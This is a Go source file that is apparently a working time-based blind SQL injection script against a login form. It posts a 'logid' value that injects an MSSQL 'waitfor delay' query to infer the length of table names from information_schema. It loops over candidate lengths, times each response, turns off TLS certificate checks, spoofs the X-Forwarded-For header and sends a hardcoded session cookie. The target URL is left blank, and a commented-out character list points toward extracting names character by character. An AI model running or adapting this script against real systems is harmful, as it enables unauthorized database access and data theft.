package main

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"strconv"
	"strings"
	"time"
)

func main() {
	/*				var payloads = [...]string{"a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","0","1","2","3","4","5","6","7","8","9","!","@","#","$","%","^","&","*","(",")","-","_","=","+"}
					for _, value := range payloads {
	                    Httpget(value)
						}
	*/
	for i := 0; i < 76; i++ {
		Httpget(i)
	}
}
func Httpget(payload int) {
	i := strconv.Itoa(payload)
	url := "https://"
	cli := &http.Client{Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}}
	time_start := time.Now()
	req, err := http.NewRequest("POST", url, strings.NewReader(`guest=false&logid=admin'IF(len((SELECT TOP 1 table_name FROM information_schema.tables where table_name != 'global_config' and table_name != 'admin_sub_category' and table_name != 'group_info' and table_name != 'group_tree'))=`+i+`) waitfor delay'0:0:20'--&pwd=ugKoBSdM6GKIki0Zuv8=`))

	if err != nil {
		fmt.Println(err)
	}

	req.Header.Add("Cookie", "PHPSESSID=44038bbbamf8h1kc017hr7ra61")
	req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0")
	req.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req.Header.Add("Accept-Language", "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3")
	req.Header.Add("Dnt", "1")
	req.Header.Add("X-Forwarded-For", "8.8.8.8")
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Add("Content-Length", "151")
	req.Header.Add("Connection", "close")

	do, err := cli.Do(req)
	if err != nil {
		fmt.Println(err)
	}
	defer func() {
		_ = do.Body.Close()
	}()
	all, _ := ioutil.ReadAll(do.Body)
	html := string(all)
	if do.StatusCode == 200 && strings.Contains(html, "alert") {
		fmt.Print(i + "用时")
		fmt.Println(time.Since(time_start))
	}
	//                   fmt.Println(html)
}
